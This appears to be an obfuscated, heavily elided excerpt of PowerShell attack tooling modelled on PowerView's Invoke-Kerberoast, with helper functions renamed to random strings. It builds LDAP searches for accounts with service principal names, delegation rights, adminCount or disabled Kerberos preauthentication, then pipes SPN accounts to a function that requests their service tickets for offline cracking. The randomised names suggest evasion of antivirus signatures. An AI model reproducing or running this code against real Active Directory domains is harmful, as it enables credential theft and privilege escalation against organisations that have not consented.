    ...
    PROCESS {
        ...
        if (-not $PSBoundParameters['Server']) {
            ...
            try {
                ...
                throw "[TEWBLZSU] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $BindServer = $Server
        ...
        $SearchString += $DN
        Write-Verbose "[TEWBLZSU] search string: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[TEWBLZSU] Using alternate credentials for LDAP connection"
    ...
    PROCESS {
        ...
        ForEach ($Object in $TargetObject) {
            ...
            try {
                ...
                Write-Warning "[LPBJK8Y5] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
...
function U9LZDUCL {
    ...
    BEGIN {
        ...
        $UserSearcher = TEWBLZSU @SearcherArguments
    }
    ...
    PROCESS {
        ...
        if ($UserSearcher) {
            ...
            $Identity | Where-Object {$_} | ForEach-Object {
                ...
                elseif ($IdentityInstance -match '^CN=') {
                    ...
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        ...
                        Write-Verbose "[U9LZDUCL] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = TEWBLZSU @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[U9LZDUCL] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                ...
                elseif ($IdentityInstance.Contains('\')) {
                    ...
                    if ($ConvertedIdentityInstance) {
                        ...
                        Write-Verbose "[U9LZDUCL] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = TEWBLZSU @SearcherArguments
                    }
                }
                else {
            ...
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[U9LZDUCL] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[U9LZDUCL] Searching for users who can be delegated'
                
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[U9LZDUCL] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[U9LZDUCL] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[U9LZDUCL] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[U9LZDUCL] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[U9LZDUCL] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            ...
            Write-Verbose "[U9LZDUCL] filter string: $($UserSearcher.filter)"
            ...
            if ($Results) {
                try { $Results.dispose() }
                    ...
                    Write-Verbose "[U9LZDUCL] Error disposing of the Results object: $_"
                }
            }
...
function Invoke-Kerberoast {
    ...
    PROCESS {
        ...
        U9LZDUCL @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | LPBJK8Y5 -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
    }
